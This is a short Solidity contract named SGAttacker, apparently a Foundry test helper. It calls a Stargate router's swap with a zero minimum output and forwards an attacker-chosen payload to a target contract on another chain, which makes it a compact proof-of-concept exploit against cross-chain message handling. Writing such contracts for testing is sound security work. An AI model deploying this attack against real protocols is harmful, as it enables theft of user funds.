pragma solidity ^0.8.15;

import "@/L2/interfaces/IStargateRouter.sol";
import "solmate/tokens/ERC20.sol";

import "forge-std/console.sol";

contract SGAttacker {
    function attack(
        address sgRouter,
        uint16 destChainId,
        uint256 srcPoolId,
        uint256 dstPoolId,
        address token,
        uint256 amount,
        address target
    ) public {
        IStargateRouter stargateRouter = IStargateRouter(sgRouter);
        ERC20(token).approve(sgRouter, amount);
        stargateRouter.swap{value: 500 ether}(
            destChainId,
            srcPoolId,
            dstPoolId,
            payable(msg.sender),
            amount,
            0,
            IStargateRouter.lzTxObj(100000, 0, "0x"),
            abi.encodePacked(target),
            "1"
        );
    }
}